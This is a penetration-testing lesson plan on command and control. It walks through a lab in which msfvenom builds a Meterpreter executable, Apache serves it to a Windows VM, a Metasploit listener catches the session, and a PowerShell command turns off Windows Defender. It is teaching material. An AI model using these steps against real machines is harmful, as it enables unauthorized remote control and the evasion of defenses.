## 1.3 Lesson Plan: Command and Control

#### Overview

 In today's lesson, we start by learning what command and control (C2) is and how it's used by malicious actors in order to communicate with computers they control or have compromised.

#### Class Objectives

By the end of class, students will be able to:

- Explain what C2 is and how it fits in an offensive security operation

- Use Metasploit to generate a malicious executable with `msfvenom` and establish a connection back to their C2 server

- Perform basic reconnassiance with Meterpreter

### Lab Environment

Students will use their Kali virtual machine to act as the C2 "server" and run their generated malicious executable on the Windows 10 virtual machine. 

### Slideshow and Timetracker

The lesson slides are available on Google Drive here: [1.2 Slides](https://docs.google.com/presentation/d/1AUuAjxX7_oIm5TOJHHXP6qROy8kmxuhMzVqyov3RVNs/edit?usp=sharing)

### 01. Instructor Do: C2 Architecture and the Metasploit Framework
 
Welcome students back to class and explain that today we will be learning what a command and control framework is and how it's used in an offensive operation. We will also introduce students to their first C2 framework, Metasploit.

`Note:` Metasploit is considered both an exploitation and Command and Control framework, where most C2 platforms today are just C2 frameworks (No exploitation).

Students should have an understanding of the cyber 'kill chain' in which today we will explore how the command and control architecture assists throughout the process. 

When an attacker compromises a computer, they directly control that machine. Throughout the cyber kill chain, an attacker will compromise several machines, which means several machines are then communicating with that single attacking machine. This is know as 'command and control'.

Explain to students that we will discuss two things: C2 Architecture and C2 frameworks. 

- C2 architecture is made up of two things: the C2 server and the C2's agents. An "Agent" is just the payload that is run on the machine in order to open up a connection back to the C2 server. C2 Architecture is how the C2 server is setup and how the agent communicates back to the C2 server. 

- A C2 framework is the actual program that controls the agents on the compromised machine. There are various types of C2 frameworks that we will learn about, but for this class our C2 framework will be Metasploit.



In order to compromise a machine, the C2 agent needs to be running on it.

- C2 agent is the malicious payload that is run on the target machine and ultimately is what is used to communicate back to the C2 server. Most C2 frameworks have an option to generate an agent. Note that the agent typically runs as a process and needs to be continously running in order for communication to flow consistently between it and the C2 server.

Once the machine has the C2's agent running on it, it is now compromised and sometimes referred to as a "zombie". Multiple zombies form a "botnet". These compromised machines are then controlled through that single C2 server.

Note: C2 architecture has evolved signficiantly over the past decade so that the true C2 server is concealed through various methods, instead of a direct Server -> Host architecture. For this class, we will focus on the direct architecture.

- Most C2 frameworks support multiple different ways of how the agent communicates back with the server, also known as "channels".

A compromised host can communicate using either a single channel or several channels over various protocols. Some of these protocols include

- DNS
- HTTP
- HTTPS
- TCP (Arbritary port)
- SMB

The protocol being used is dependent on the target's network firewall egress rules. Typically, most egress rules allow HTTP/S and DNS outbound, which is why those channels are commonly used for C2 communication.

While under the control of a C2 server, a zombie will periodically communicate back with the C2 server to 'check-in' for any updates. This is commonly referred to as a 'heartbeat'. Whenever a compromised computer checks in with the C2 server, it will do two things.

1) Let the server know the malicious process is still running
2) Ask for any instructions 

When the compromised computer asks for any instructions, it's asking if any commands need to be executed. 

For example, if the operator of the C2 server issues a command, `pwd`, to the compromised machine, that command is only run when the compromised machine checks-in with the C2 server. This interval is commonly able to be changed and is depedant on the C2 framework being used.

The C2 framework we will be using for this class is Metasploit. Metasploit is both a C2 and exploit framework, supporting a variety of different payloads. 

- Metasploit will be heavily used during this module, however we are simply introducing them to Meterpreter to demonstrate how C2 works.

- We will cover the capabilities of the 'Meterpreter' shell later in the course.

Explain to students that while we will only be using Metasploit in this class, most C2 frameworks are opensource which allow you to use them freely. It's considered good practice to have multiple C2 frameworks available for a penetration test or red team engagement.

- C2 Frameworks each have their own "fingerprints" or "indicators of compromise"

- For example, Metasploit's payload & agent generator, msfvenom, will generate a payload in a specified format (e.g. .Exe). These payloads have well known signatures that Antivirus products will alert on and kill the payload. 

- In an event where a certain AV product is killing the payload, it would be a good idea to switch C2 frameworks.

In addition, not all C2 frameworks support every OS. Some only support Windows and not Linux, for example. In this event, it's good to have a secondary C2 framework that supports an OS if the primary C2 framework doesn't support it. 

### 02. Student Do: Command and Control Framework research

In this activity, students will research various C2 frameworks in order to fit their upcoming penetration testing engagement.

[Student Do Activity Link](01-C2Research.md)

Share the following link with students: https://www.thec2matrix.com/matrix

[Student Do Solved Link](01-C2Research-Solved.md)

### 03. Instructor Do: Command and Control Framework Research Review

One potential example is Cobalt Strike. It has the necessary logging, multitenancy capibilities and supports Windows machines which makes it an ideal fit for the customers environment. Since it does not support Linux machines, the secondary C2 could be Empire. 

### 04. Instructor Do: C2 Recap

Students should now have an understanding of what C2 is and how it is used throughout the entire penetration testing lifecycle. 

Re-iterate that the C2 framework runs on a machine or server, and that machine or server then becomes the C2 server that the C2 agents communicate with. The penetration testers connect to the C2 server and are able to issue commands to the compromised computers through the agent's communication channel.

We will now introduce the C2 framework they will be using throughout the class: Metasploit. 

Before continuing to introduce Metasploit, ask if there are any questions.

### 05. Instructor Do: Metasploit Framework and msfvenom

Remind students that as shown in their research activity, there are many choices for C2. In this class, however, we will be focusing on using Metasploit.

- Metasploit is a tool that has been around for quite a bit and owned by the company Rapid 7. 

- There's a free version, which is what comes installed on Kali by default, and a professional version, which expands on it's exploitation and C2 capabilities

Metasploit has an additional component, msfvenom, which allows the operator to craft the malicious agents and payloads that will be used to communicate back with Metasploit.

- Metasploit works through its use of "modules". There are many different types of modules, the main ones we will be focusing on in class are:

1. Auxiliary - port scanners, fuzzers, sniffers, and more.

2. Payloads - Payloads consist of code that runs remotely

3. Encoders - encoders ensure that payloads make it to their destination intact

4. Exploits - exploit modules are defined as modules that use payloads.

5. Post - Modules used after an exploit module is successful. 


### 06. Class Do: Metasploit and msfvenom demonstration

This activity is meant to be done as a class. Slack out the following guide to students [Student Do: Metasploit and MSFVenom](02-Metasploit-Solved.md)

Explain to students that we need to do two things in order to establish our C2 server and deploy our agent on the target.

1. We first will need to load up Metasploit and start a "listener" that listens for the agent's communication

2. We need to generate our agent using `msfvenom`


#### Starting Metasploit 

1. Login to the Kali machine with credentials `root/toor`

2. Click on the Metasploit icon on the taskbar

Explain to students that unlike most C2 frameworks, Metasploit is purely commandline based and has no web application or GUI. 

3. Once metasploit is started, type `use exploit/multi/handler` 

Explain to students that in order for the payload/agent we're going to craft to communicate back to Metasploit, we need to start something called a 'listener' that "listens" for the payload to talk back.

- Without starting a listener, the C2 server will not be able to communicate with any agents.

- In this case, we're using the `exploit/multi/handler` module which is Metasploit's listener module.

4. Type `ip addr` to get the IP address of the Kali machine, then type `set LHOST <kali ip address>`

5. After the LHOST (listener host) is set, set the LPORT by typing `set LPORT 4444`

![](/Images/01.Metasploitoptions.PNG)

6. Once LPORT and LHOST is set, start the listener by typing `run -j`. The `-j` option sets it to run in background.

Explain to students now that Metasploit listener is running, our Kali machine is now acting as a C2 server running Metasploit as a C2 framework. Now that we have our C2 server running, we need to generate an agent to be used.

7. Next, generate the agent/payload by typing `msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe` 

![](/Images/02.Metasploitmsfvenom.PNG)

Explain to students that since we've now created our agent in a .exe format, we need to transport it to the target some how. Typically in a real engagement, this is done through phishing or social engineering. For our demonstration, we will host it on a web server on our Kali machine. 

8. Clear out the /var/www/html/ folder: `rm /var/www/html/*`

9. Move the payload to /var/www/html: `mv shell.exe /var/www/html/`

10. Start the apache web service by typing `service apache2 start`

![](/Images/03.apache.PNG)

11. Now move from your Kali VM to your Windows VM. Open an web browser and browse to your Kali's IP address. Download the `shell.exe` payload and execute it.

- Note: Windows Defender should be turned off. If not turned off, open PowerShell as administrator and run `Set-MPPreference -DisableRealTimeMonitoring $true` 

![](/Images/04.Windows.PNG)

12. Back in Kali, you should see a message "Meterpreter Session 1 opened". To interact with this session, type `sessions -i 1`

![](/Images/05.Session.PNG)

13. You now have a shell into the Windows machine, with Metasploit operating as the C2 server. Demonstrate commands such as `ls` and `pwd` to show you're on the Windows machine.

![](/Images/06.Command.PNG)

We will explore the capabilities of the Meterpreter shell later in the course. 

### 07. Instructor Do: Metasploit Framework and msfvenom Recap

Explain to students that once the session is opened, the agent we created and executed is now communicating back to our C2 server (Kali/Metasploit). This demonstrates the basic C2 architecture style of Client -> server. 

- The agent is communicating with Metasploit and constatly looking for new instructions. When we issue a command, `ls` for example, the agent receives this command once it checks in. The agent will then run the command and send the output of the command back to Metasploit.

- We've now demonstrated the initial access portion of the penetration testing cycle. Explain that there are other ways and this demonstration does not factor in certain things like anti-virus or detection solutions.

Answer any questions before continuing on.